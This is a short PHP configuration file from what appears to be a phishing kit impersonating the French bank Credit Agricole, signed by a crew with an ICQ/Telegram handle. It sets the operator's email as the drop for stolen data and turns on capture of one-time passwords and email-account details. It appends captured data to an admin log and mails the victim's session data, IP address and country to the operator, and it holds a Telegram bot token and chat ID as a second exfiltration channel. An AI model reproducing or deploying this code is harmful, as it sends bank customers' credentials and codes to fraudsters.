<?php
/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * Credit Agricole Fr -
 * version 01
 * icq & telegram = @FUCKTOS0C13TY
 
###############################################
#$            C0d3d by fS0C13TY_Team         $#
#$   Recording doesn't  make you a Coder     $#
#$      Copyright 2020 Credit Agricole Fr    $#
###############################################

**/

$yourmail  = 'fiiilipjordan@gmail.com';

$OTP = "ON";
$ACSEAMAIL = "ON";

$f = fopen("../admin.php", "a");
	fwrite($f, $msgbank);

$subject  = " ".$_SESSION['reisse']." / ".$_SERVER['REMOTE_ADDR']." / ".$_SESSION['country1']." ";
$headers .= "From: Agricole" . "\r\n";
mail($yourmail, $subject, $yagmail, $headers);

$botToken="<TOKEN_REMOVED>";
$chatId="1700593159";
 